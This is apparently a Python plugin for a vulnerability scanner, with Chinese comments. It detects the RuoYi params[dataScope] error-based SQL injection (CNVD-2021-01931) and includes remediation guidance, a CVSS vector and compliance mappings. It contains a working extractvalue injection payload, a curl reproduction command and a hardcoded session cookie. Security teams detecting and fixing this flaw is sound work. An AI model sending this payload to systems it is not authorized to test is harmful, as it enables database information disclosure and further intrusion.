"""若依 /system/role/list 的 params[dataScope] 参数 SQL 报错注入检测（CNVD-2021-01931）。"""
# SQL 报错注入（role）：/system/role/list 的 params[dataScope] 参数 extractvalue 报错注入
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import host_of, join_url
from lib.colors import no, ok
from plugins.base import PluginBase


class SqlInjectRolePlugin(PluginBase):
    name = "POST型报错注入（role）"
    cve = "CNVD-2021-01931"
    severity = "high"
    category = "vuln"
    description = "/system/role/list 的 params[dataScope] 参数拼接 extractvalue 报错注入，泄露 database()"
    fix = "对 dataScope 参数做白名单校验，禁止拼接 SQL，使用参数化查询"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.6.0+（该版本已修复 params[dataScope] 注入）\n"
        "【代码修复】修改 SysRoleMapper.xml，对 dataScope 参数做白名单校验：\n"
        "  - 修改前：${params.dataScope}（直接拼接）\n"
        '  - 修改后：使用 DataScopeUtil.checkDataScope(params.get("dataScope")) 白名单校验\n'
        "【配置加固】启用 MyBatis 参数化：mybatis.configuration.safe-result-handler-enabled: true\n"
        "【WAF 规则】拦截包含 extractvalue/updatexml/concat 的 dataScope 参数\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验"
    )
    reproduce = (
        'curl -X POST "http://target/system/role/list" \\\n'
        '  -H "Content-Type: application/x-www-form-urlencoded" \\\n'
        '  -H "Accept: application/json" \\\n'
        "  -d 'params[dataScope]=and extractvalue(1, concat(0x7e,(select database()),0x7e))' \\\n"
        '  --cookie ""\n'
        "\n"
        '# 预期响应：HTTP 500 + 响应体含 "运行时异常" 或 "database()" 报错特征'
    )
    # D2：params[dataScope] 注入在 4.6.0 已修复
    affected_versions = ">=4.0,<4.6"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    # D7: WAF 绕过支持
    vuln_type = "sqli"
    supports_waf_bypass = True

    def verify(self, target, session):
        """对 /system/role/list 的 params[dataScope] 参数发起 extractvalue 报错注入探测。

        @param target: 目标站点根 URL
        @param session: 共享 HTTP 会话（SessionManager 管理连接复用）
        @return: ScanResult — 响应含 '运行时异常' 或 'database()' 报错特征则 CONFIRMED，否则 SAFE，网络异常则 UNKNOWN
        """
        host = host_of(target)
        # 原 headers 1:1 保留（含 Origin/Referer/Cookie 等）
        headers = {
            "Host": host,
            # 浏览器指纹头的键名 "nt" 为原脚本 1:1 保留（非标准 User-Agent 键名），保持请求形态与原始注入脚本一致
            "nt": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": f"http://{host}",
            "Connection": "close",
            "Referer": f"http://{host}/system/role",
            "Cookie": "UMK8_2132_ulastactivity=fdf6lh5P4KaIR7rPwncVmGmx5z2ymLLNz3o33msgkFJlQ1SdH/hR; UMK8_2132_lastcheckfeed=1|1637287051; UMK8_2132_nofavfid=1; JSESSIONID=d9eca4a4-7fcd-41ba-9888-75e7c73dc9bf",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        # 原 data 1:1 保留（含 extractvalue payload）
        # extractvalue(1, concat(0x7e, ...)) 注入原理：0x7e（~）使第二参数成为非法 XPath，
        # MySQL 报错时把 database() 子查询结果回显进错误信息，异常文案即判定特征
        data = {
            "pageSize": "",
            "pageNum": "",
            "orderByColumn": "",
            "isAsc": "",
            "roleName": "",
            "roleKey": "",
            "status": "",
            "params[beginTime]": "",
            "params[endTime]": "",
            "params[dataScope]": "and extractvalue(1,concat(0x7e,(select database()),0x7e))",
        }
        url = join_url(target, "/system/role/list")
        try:
            sql_inject = session.post(url, headers=headers, data=data).text
        except Exception as e:
            print(no("POST型报错注入（role，网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        # 判定 1:1 保留：'运行时异常' in t or 'database()' in t
        if "运行时异常" in sql_inject or "database()" in sql_inject:
            print(ok("存在POST型报错注入"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 运行时异常 或 database() 报错特征",
                fix=self.fix,
            )
        else:
            print(no("不存在POST型报错注入"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
